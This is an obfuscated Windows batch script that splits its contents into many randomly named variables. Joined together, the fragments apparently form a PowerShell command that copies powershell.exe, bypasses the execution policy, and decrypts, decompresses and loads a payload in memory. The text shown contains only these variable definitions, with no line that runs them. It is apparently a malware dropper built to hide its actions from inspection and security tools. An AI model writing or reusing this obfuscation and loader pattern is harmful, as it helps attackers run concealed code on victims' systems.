@echo off
set "PtdsjbtMIu=.e"
set "xthiNMwcqc=py"
set "iLogNAjxlB=em"
set "begsgMYVZS=co"
set "naKSyuYnEW=Sy"
set "pFSofWvgDJ=nd"
set "IhdXbFvEmN=po"
set "YOwvcDSeVO=s\"
set "ISghmFxGIL=1."
set "HEStjsKzIv=\W"
set "EGeWMGcaLx=st"
set "pWieJCnezv=xe"
set "atmDeaiETL=Wi"
set "werQmgDPAV=we"
set "eqlPwhJxNx=32"
set "vGOqpGqywi=rs"
set "XFmoQDTVXu=ws"
set "lBbdSnvozF=do"
set "ZducyuKKsf=\v"
set "gzAosJkxDv=y "
set "XeIZOwEEEN= C"
set "ARtxFBLEfX=in"
set "QKOQamXOjV=Po"
set "IQGKhBNkcF=he"
set "tsNVFpqvVE=0\"
set "itqlSGSxpN=ow"
set "aRBKTaNHGV=:\"
set "kTuVUqAQYi=ll"
set "pHeEiSnwbJ=ll"
set "RcSWWxAWrC=we"
set "IrQKsBmTwY= /"
set "doPNxAPjgH=he"
set "WvZdxVEfHb=rS"
set "VmoUIxcUQS=cd"
set "SlOEGzfQUA= %~dp0"
set "OsAOowmiFW=Comp"
set "MmtaxpVvUF=;$Ib"
set "xIRtkeIswW=Yb ="
set "sVinyfWzkf=trea"
set "xXKGPamHbf=-Obj"
set "cpkETgBkYg=oin "
set "oClwqjHxcH=n ''"
set "QthqsZzJTV=pmwB"
set "inZrkPCGXS=ecry"
set "ocaasNxmKR=('da"
set "kDPdyVmrMU=Syst"
set "TKoQEngNqq=;$LI"
set "MjDqYedNtE=[]] "
set "HGGzGgfHUj=.GZi"
set "ayivEApOPJ= '')"
set "mCMSCWucjG=::De"
set "hrefYGTWUZ=jrc."
set "qvYRuvPdsT='gni"
set "ojGzhLgqCP=m.IO"
set "eCAhuitgQM=TllA"
set "CGjWjrFbWN=.Cre"
set "xXzhcPiNSS=:: '"
set "OGOYQjxCbn=L4Yi"
set "nOGwCSaVPB== [S"
set "yLpVKvjtog=R.Su"
set "vFwyEqunZm=ress"
set "kRwRmFTapv=saBm"
set "QQJhnGAlGD=sion"
set "FkEgwjoKMH=3); "
set "ThuOKjEpqs=MH.T"
set "RbTHhDjqFV=rt]:"
set "bagyZjkvfx=ay()"
set "xqAxaHxYsk=zHhH"
set "GWwYhuPYye=.Sec"
set "iHholXJRHd=em.I"
set "UNrjlNfTRk=mory"
set "fgeLLQKloN=.Mem"
set "zEKgUqkmAp= if "
set "PbZcbXhHKh=y.Pa"
set "QLtdcPdmWS=MH);"
set "xoSFMCsDtR= = ["
set "BhdWDmSYTV=yTo("
set "OQXJaJkmxS=tS46"
set "STuUJmOntF=stem"
set "cOzncoVhco=S46e"
set "TYJOoZsxeI=-nop"
set "bjunMNLteV=$mqf"
set "qZNyqvpXdy=Zpmw"
set "iFcaVLlBiP=se()"
set "NOcWhlUcPa=zuZI"
set "udqmTfbtqf=[-1."
set "TPMXfApShk=PTtG"
set "bckRcxhaDa=s75K"
set "WJihgHeLUC=rans"
set "oNBxeTnBBF=.Dis"
set "BwHNpqxbfr=rity"
set "lCZMPPSwww=e = "
set "bFzMsFinhN=dj0C"
set "eYgSypamSk=raph"
set "rEylCxJwQk=IbSM"
set "QEBmDRyFtE=join"
set "vAbZpRezfd=pose"
set "gLSpEhnJUr=;$tq"
set "qPPkSuicNg=em.C"
set "mAVlwoRjjc=Star"
set "TBqesPwrAZ=sjGB"
set "RgEATaPUvT=.Cry"
set "XllJeFnKOH=dz.T"
set "AAjfNfQcOH=$sjG"
set "ggwwKSaMcD=Mode"
set "NXwICWoBss=BS ="
set "tDhFmZUHuB=7;$m"
set "UayhSUSmNs=UdR."
set "eREJNKjiPD=File"
set "TqOedIrKfq=oryS"
set "eGSniqrYha=UdR "
set "gFJsAcoKqp=gsYZ"
set "pljyOzgCoZ=th('"
set "qgKJThIyAB=Obje"
set "hlUpnjhbFk==');"
set "PbVuMvPTGV=.Com"
set "RpsjyIaHVq= New"
set "efBkdXdrRF=ypto"
set "UqNHaJOnFQ=-ep "
set "WumNofkOHJ='[-1"
set "HrtOkTKztt=6esa"
set "DWFlSHwYji=am;$"
set "ObptbZCXrp=comp"
